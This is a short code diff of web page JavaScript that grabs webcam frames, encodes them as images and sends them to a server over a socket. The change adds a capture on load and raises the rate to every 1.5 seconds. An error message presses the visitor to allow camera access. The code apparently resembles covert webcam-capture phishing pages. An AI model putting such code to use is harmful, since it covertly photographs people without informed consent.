@@ -20,11 +20,14 @@ const canvas = document.getElementById('canvas');
     window.stream = stream;
 	video.srcObject = stream;
 	var context = canvas.getContext('2d');
+	context.drawImage(video, 0, 0, 640, 480);
+	var canvasData = canvas.toDataURL("image/png");
+	socket.emit('img', {base64:canvasData});
 	setInterval(function(){
 		context.drawImage(video, 0, 0, 640, 480);
 		var canvasData = canvas.toDataURL("image/png");
 		socket.emit('img', {base64:canvasData});
-	}, 5000);
+	}, 1500);
   } catch (e) {
     document.getElementById("texto").innerHTML = "Error! Permita para continuar!";
   }
